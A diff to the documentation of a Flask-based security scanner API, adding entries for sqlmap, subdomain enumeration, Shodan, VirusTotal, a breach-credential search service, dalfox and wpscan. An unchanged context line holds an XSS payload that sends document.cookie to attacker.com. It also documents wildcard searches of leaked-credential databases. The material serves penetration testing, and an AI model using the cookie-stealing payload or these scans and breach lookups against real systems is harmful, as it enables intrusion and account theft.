@@ -28,13 +28,13 @@ The Security Scanner API is an asynchronous Flask-based REST API that provides a
 - Enhanced security (SSRF protection, injection detection, timing-attack resistant auth)
 
 **Security Features:**
-- ✅ Timing-attack resistant authentication
-- ✅ Enhanced SSRF protection (blocks AWS/Azure/Alibaba metadata IPs)
-- ✅ Injection pattern detection (shell metacharacters, commands)
-- ✅ API key-based job ownership (not IP-based)
-- ✅ Comprehensive security headers
-- ✅ Rate limiting (100 req/hour per IP)
-- ✅ Audit logging for security events
+- Timing-attack resistant authentication
+- Enhanced SSRF protection (blocks AWS/Azure/Alibaba metadata IPs)
+- Injection pattern detection (shell metacharacters, commands)
+- API key-based job ownership (not IP-based)
+- Comprehensive security headers
+- Rate limiting (100 req/hour per IP)
+- Audit logging for security events
 
 ---
 
@@ -1312,6 +1312,256 @@ Comprehensive Cross-Site Scripting (XSS) vulnerability detection and exploitatio
 {"tool": "xssstrike", "target": "http://example.com", "params": {"custom_payloads": ["<script>alert(document.domain)</script>", "<img src=x onerror=fetch('http://attacker.com/'+document.cookie)>"]}}
 ```
 
+### 19. SQL Injection Testing & Exploitation (sqlmap)
+Automated SQL injection detection and exploitation tool.
+
+**Parameters:**
+- `url` - Target URL (overrides target parameter)
+- `data` - POST data for form testing
+- `cookie` - Cookie values for authenticated testing
+- `level` (1-5) - Test level (default: 1)
+- `risk` (1-3) - Risk level (default: 1)
+- `technique` - SQL injection techniques to use
+- `dbms` - Force DBMS detection
+- `threads` (1-10) - Number of threads
+- `timeout` (10-300) - Request timeout
+
+**Usage:**
+```json
+{
+    "tool": "sqlmap",
+    "target": "http://testphp.vulnweb.com/artists.php?artist=1",
+    "params": {
+        "level": 2,
+        "risk": 2,
+        "threads": 5
+    }
+}
+```
+
+### 20. Subdomain Enumeration & Discovery (subdomainfinder)
+Comprehensive subdomain discovery using multiple techniques.
+
+**Parameters:**
+- `use_subfinder` (boolean) - Use subfinder tool
+- `use_assetfinder` (boolean) - Use assetfinder tool
+- `use_shodan` (boolean) - Use Shodan API
+- `threads` (1-50) - Number of threads
+- `timeout` (30-600) - Scan timeout
+- `wordlist` - Custom wordlist path
+
+**Usage:**
+```json
+{
+    "tool": "subdomainfinder",
+    "target": "example.com",
+    "params": {
+        "use_subfinder": true,
+        "use_assetfinder": true,
+        "threads": 20
+    }
+}
+```
+
+### 21. Shodan Intelligence Gathering (shodansearch)
+Internet-wide asset discovery using Shodan search engine.
+
+**Parameters:**
+- `query` - Search query (defaults to target)
+- `facets` - Facet fields for statistics
+- `limit` (1-1000) - Maximum results
+- `country` - Country filter
+- `city` - City filter
+
+**Usage:**
+```json
+{
+    "tool": "shodansearch",
+    "target": "apache",
+    "params": {
+        "query": "apache country:US",
+        "limit": 100,
+        "facets": "country,org,port"
+    }
+}
+```
+
+**Note:** Shodan API key is configured server-side for security.
+
+### 22. VirusTotal Domain Analysis (virustotal)
+Domain reputation analysis using VirusTotal database.
+
+**Parameters:** None (uses target domain only)
+
+**Usage:**
+```json
+{
+    "tool": "virustotal",
+    "target": "example.com"
+}
+```
+
+**Output:**
+```json
+{
+    "tool": "virustotal",
+    "target": "example.com",
+    "results": {
+        "domain": "example.com",
+        "positives": 0,
+        "total": 68,
+        "subdomains": ["www.example.com", "mail.example.com"],
+        "resolutions": [{"ip_address": "93.184.216.34", "last_resolved": "2024-01-01"}]
+    },
+    "statistics": {
+        "detection_ratio": "0/68",
+        "total_subdomains": 2,
+        "total_resolutions": 5
+    }
+}
+```
+
+**Note:** VirusTotal API key is configured server-side for security.
+
+### 23. Breach Database Search (breachvip)
+Search breach databases for compromised credentials.
+
+**Parameters:**
+- `query` - Search term (defaults to target)
+- `fields` - Array of fields to search (email, username, phone, etc.)
+- `categories` - Array of breach categories
+- `wildcard` (boolean) - Enable wildcard matching
+- `case_sensitive` (boolean) - Case-sensitive search
+
+**Valid Fields:** name, email, phone, password, discordid, ip, username, uuid, domain, steamid
+
+**Usage:**
+```json
+{
+    "tool": "breachvip",
+    "target": "test@example.com",
+    "params": {
+        "query": "test@*.com",
+        "fields": ["email", "username"],
+        "wildcard": true,
+        "categories": ["minecraft"]
+    }
+}
+```
+
+**Note:** BreachVIP API key is configured server-side for security.
+
+### 24. Advanced XSS Scanner (dalfox)
+Advanced Cross-Site Scripting detection using Dalfox.
+
+**Parameters:**
+- `crawl_depth` (1-5) - Crawling depth for discovery
+- `timeout` (5-60) - Request timeout in seconds
+- `user_agent` - Custom User-Agent string
+- `cookie` - Cookie values for authenticated scanning
+- `headers` - Custom HTTP headers object
+- `method` - HTTP method (GET/POST)
+- `data` - POST data for form testing
+- `mining_dict` (boolean) - Enable dictionary-based parameter mining
+- `mining_dom` (boolean) - Enable DOM-based parameter mining
+- `follow_redirects` (boolean) - Follow HTTP redirects
+- `silence` (boolean) - Reduce output verbosity
+
+**Usage:**
+```json
+{
+    "tool": "dalfox",
+    "target": "http://testphp.vulnweb.com",
+    "params": {
+        "crawl_depth": 3,
+        "timeout": 15,
+        "mining_dict": true,
+        "mining_dom": true
+    }
+}
+```
+
+**Output:**
+```json
+{
+    "tool": "dalfox",
+    "target": "http://testphp.vulnweb.com",
+    "vulnerabilities": [
+        {
+            "severity": "high",
+            "param": "search",
+            "payload": "<script>alert(1)</script>",
+            "evidence": "XSS vulnerability found"
+        }
+    ],
+    "statistics": {
+        "total_vulnerabilities": 1,
+        "severity_breakdown": {"high": 1, "medium": 0, "low": 0}
+    }
+}
+```
+
+### 25. WordPress Security Scanner (wpscan)
+Comprehensive WordPress security assessment.
+
+**Parameters:**
+- `enumerate` - What to enumerate (vp,vt,tt,cb,dbe,u,m,ap,at)
+- `detection_mode` - Detection mode (mixed, passive, aggressive)
+- `user_agent` - Custom User-Agent string
+- `random_user_agent` (boolean) - Use random User-Agent
+- `max_threads` (1-20) - Maximum concurrent threads
+- `request_timeout` (10-120) - Request timeout in seconds
+- `connect_timeout` (5-60) - Connection timeout in seconds
+- `disable_tls_checks` (boolean) - Disable TLS certificate verification
+- `follow_redirects` (boolean) - Follow HTTP redirects
+
+**Enumeration Options:**
+- `vp` - Vulnerable plugins
+- `vt` - Vulnerable themes
+- `tt` - Timthumbs
+- `cb` - Config backups
+- `dbe` - Database exports
+- `u` - Users
+- `m` - Media
+- `ap` - All plugins
+- `at` - All themes
+
+**Usage:**
+```json
+{
+    "tool": "wpscan",
+    "target": "https://wordpress.example.com",
+    "params": {
+        "enumerate": "vp,vt,tt,cb,dbe,u,m",
+        "detection_mode": "aggressive",
+        "max_threads": 10
+    }
+}
+```
+
+**Output:**
+```json
+{
+    "tool": "wpscan",
+    "target": "https://wordpress.example.com",
+    "results": {
+        "wordpress_version": {"number": "6.3.1", "status": "latest"},
+        "theme": {"slug": "twentytwentythree", "version": "1.2"},
+        "plugins": {"contact-form-7": {"version": "5.8"}},
+        "users": {"admin": {"id": 1, "login": "admin"}},
+        "vulnerabilities": []
+    },
+    "statistics": {
+        "total_vulnerabilities": 0,
+        "plugin_count": 1,
+        "user_count": 1,
+        "wordpress_detected": true
+    }
+}
+```
+
+**Note:** WPScan API key is configured server-side for security.
+
 ---
 
 ## Management Endpoints
@@ -1356,8 +1606,11 @@ Health check endpoint for monitoring.
     "active_scans": 2,
     "total_jobs": 150,
     "supported_tools": [
-        "wafw00f", "nmap", "nuclei", "dirb", 
-        "whatweb", "nikto", "masscan", "sslscan", "httpx", "gvm"
+        "wafw00f", "nmap", "nuclei", "dirb", "whatweb", "nikto", "masscan", 
+        "sslscan", "httpx", "gvm", "domainfinder", "cloudscanner", 
+        "passwordauditor", "drupalscanner", "joomlascanner", "sharepointscanner", 
+        "cvesearch", "sqlmap", "subdomainfinder", "shodansearch", "xssstrike",
+        "virustotal", "breachvip", "dalfox", "wpscan"
     ],
     "timestamp": "2024-01-01 17:30:00"
 }
@@ -1409,7 +1662,13 @@ jobs_by_status{status="failed"} 5
 ```json
 {
     "error": "Invalid tool",
-    "supported_tools": ["wafw00f", "nmap", "nuclei", "dirb", "whatweb", "nikto", "masscan", "sslscan", "httpx", "gvm"]
+    "supported_tools": [
+        "wafw00f", "nmap", "nuclei", "dirb", "whatweb", "nikto", "masscan", 
+        "sslscan", "httpx", "gvm", "domainfinder", "cloudscanner", 
+        "passwordauditor", "drupalscanner", "joomlascanner", "sharepointscanner", 
+        "cvesearch", "sqlmap", "subdomainfinder", "shodansearch", "xssstrike",
+        "virustotal", "breachvip", "dalfox", "wpscan"
+    ]
 }
 ```
 
@@ -1436,8 +1695,8 @@ jobs_by_status{status="failed"} 5
     "status": "running"
 }
 ```
-
 ---
+
 ## Best Practices
 
 ### 1. Job Management
